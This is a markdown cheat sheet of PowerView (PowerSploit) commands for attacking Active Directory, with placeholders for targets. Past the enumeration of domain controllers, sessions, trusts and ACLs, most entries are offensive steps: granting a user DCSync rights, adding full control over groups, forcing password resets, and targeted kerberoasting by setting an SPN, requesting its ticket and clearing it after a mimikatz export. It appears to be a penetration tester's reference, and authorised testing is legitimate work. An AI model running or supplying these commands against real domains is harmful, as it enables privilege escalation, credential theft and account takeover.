### source 
https://raw.githubusercontent.com/AdrianVollmer/PowerSploit/master/Recon/PowerView.ps1  

### get domain controller for current domain
```
Get-NetDomainController
```

### get remote logged in user
```
Get-NetSession -ComputerName <fqdnRhost>
```

### get object descriptions
```
Get-NetUser | select-object samaccountname,description | fl | Out-File <file>.txt
```

### get specific user description
```
Get-NetUser -Username <user> 
```

### get list of all domain trusts
```
Get-NetDomainTrust
```

### get details about the current forest
```
Get-NetForest
```

### find all machines where user has local admin rights
```
Find-LocalAdminAccess –Verbose -Domain <domain> -Computername <rhost>
```

### show all security identifiers (SID) that can create new GPOs
```
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=<domainComponent>,DC=<domainComponent>" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

### get name of SID
```
ConvertFrom-SID <securityIdentifier>
```

### show all principals that can write to GP-Link attributes
```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
```

### get computeraccounts in specific OU
```
Get-DomainComputer | ? { $_.DistinguishedName -match "<distinguishedName>" -or $_.DistinguishedName -match "OU=<ou>" } | select DnsHostName
```

### add full permissions over a group to specific user (right = All or ResetPassword or WriteMembers)
```
Add-ObjectAcl -TargetADSprefix '<distinguishedName>' -PrincipalSamAccountName <user> -Rights <right> -Verbose
```

### add DCSync right to a specific user
```
Add-ObjectAcl -TargetDistinguishedName 'distinguishedName' -PrincipalSamAccountName <user> -Rights DCSync -Verbose
```

### set a new password for specific user
```
Set-DomainUserPassword -Identity <user> -AccountPassword (ConvertTo-SecureString "<password>" -AsPlainText -Force) -Verbose
```

### check if user has SPN set (targeted kerberoast)
```
Get-DomainUser -Identity <user> | select serviceprincipalname
Get-DomainComputer -Identity <user> | select serviceprincipalname
```

### set a new SPN
```
Set-DomainObject -Identity <userOrComputer> -Set @{serviceprincipalname='foo/bar'}
```

### request ticket from SPN
```
Request-SPNTicket -SPN 'foo/bar'
```

### after export of tickets using mimikatz remove SPN
```
Set-DomainObject -Credential $Cred -Identity <userOrComputer> -Clear serviceprincipalname
```

### list accesible shares (without -ComputerName check all domain joined hosts)
```
Find-DomainShare -CheckShareAccess -ComputerName <rhost>
```

